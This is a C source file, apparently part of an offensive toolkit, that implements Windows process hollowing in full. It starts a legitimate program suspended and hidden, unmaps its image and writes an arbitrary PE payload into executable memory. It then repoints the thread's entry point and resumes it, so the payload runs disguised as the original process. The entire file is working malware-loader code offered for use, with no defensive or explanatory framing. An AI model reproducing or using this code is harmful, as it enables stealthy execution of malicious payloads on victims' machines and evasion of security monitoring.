/*
 * Execution: Process Hollowing
 *
 * Replaces the image of a suspended process with a payload.
 * Windows only.
 */

#ifdef _WIN32

#include "jocky_rt.h"
#include <windows.h>
#include <winternl.h>
#include <stdio.h>

#pragma comment(lib, "ntdll.lib")

typedef NTSTATUS (NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);
typedef NTSTATUS (NTAPI* pNtQueryInformationProcess)(
    HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

bool jocky_process_hollow(const wchar_t* target_path,
                          const uint8_t* payload,
                          size_t payload_size)
{
    (void)payload_size;

    /* 1. Create the target process suspended */
    STARTUPINFOW si = {0};
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi = {0};

    if (!CreateProcessW(target_path, NULL, NULL, NULL, FALSE,
                        CREATE_SUSPENDED | CREATE_NO_WINDOW,
                        NULL, NULL, &si, &pi)) {
        return false;
    }

    /* 2. Parse payload PE headers */
    PIMAGE_DOS_HEADER dosHdr = (PIMAGE_DOS_HEADER)payload;
    if (dosHdr->e_magic != IMAGE_DOS_SIGNATURE) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return false;
    }

    PIMAGE_NT_HEADERS ntHdr = (PIMAGE_NT_HEADERS)(payload + dosHdr->e_lfanew);
    if (ntHdr->Signature != IMAGE_NT_SIGNATURE) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return false;
    }

    /* 3. Get target process image base */
    HMODULE hNt = GetModuleHandleA("ntdll.dll");
    pNtQueryInformationProcess NtQueryInformationProcess =
        (pNtQueryInformationProcess)GetProcAddress(hNt, "NtQueryInformationProcess");

    PROCESS_BASIC_INFORMATION pbi = {0};
    ULONG retLen = 0;
    NTSTATUS status = NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation,
                                                &pbi, sizeof(pbi), &retLen);
    if (status != 0) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return false;
    }

    PVOID targetImageBase = NULL;
    SIZE_T read = 0;
    if (!ReadProcessMemory(pi.hProcess,
                           (PCHAR)pbi.PebBaseAddress + offsetof(PEB, ImageBaseAddress),
                           &targetImageBase, sizeof(targetImageBase), &read)) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return false;
    }

    /* 4. Unmap the original image */
    pNtUnmapViewOfSection NtUnmapViewOfSection =
        (pNtUnmapViewOfSection)GetProcAddress(hNt, "NtUnmapViewOfSection");
    NtUnmapViewOfSection(pi.hProcess, targetImageBase);

    /* 5. Allocate memory for the payload */
    PVOID newImage = VirtualAllocEx(pi.hProcess, targetImageBase,
                                    ntHdr->OptionalHeader.SizeOfImage,
                                    MEM_COMMIT | MEM_RESERVE,
                                    PAGE_EXECUTE_READWRITE);
    if (!newImage) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return false;
    }

    /* 6. Write PE headers */
    SIZE_T written = 0;
    if (!WriteProcessMemory(pi.hProcess, newImage, payload,
                            ntHdr->OptionalHeader.SizeOfHeaders, &written)) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return false;
    }

    /* 7. Write sections */
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(ntHdr);
    for (WORD i = 0; i < ntHdr->FileHeader.NumberOfSections; i++) {
        PVOID dst = (PBYTE)newImage + sec[i].VirtualAddress;
        PVOID src = (PBYTE)payload + sec[i].PointerToRawData;
        WriteProcessMemory(pi.hProcess, dst, src, sec[i].SizeOfRawData, &written);
    }

    /* 8. Update PEB ImageBase */
    WriteProcessMemory(pi.hProcess,
                       (PCHAR)pbi.PebBaseAddress + offsetof(PEB, ImageBaseAddress),
                       &newImage, sizeof(newImage), &written);

    /* 9. Set thread context to new entry point */
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_FULL;
    if (GetThreadContext(pi.hThread, &ctx)) {
#ifdef _WIN64
        ctx.Rcx = (DWORD64)newImage + ntHdr->OptionalHeader.AddressOfEntryPoint;
#else
        ctx.Eax = (DWORD)newImage + ntHdr->OptionalHeader.AddressOfEntryPoint;
#endif
        SetThreadContext(pi.hThread, &ctx);
    }

    /* 10. Resume */
    ResumeThread(pi.hThread);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return true;
}

#endif /* _WIN32 */
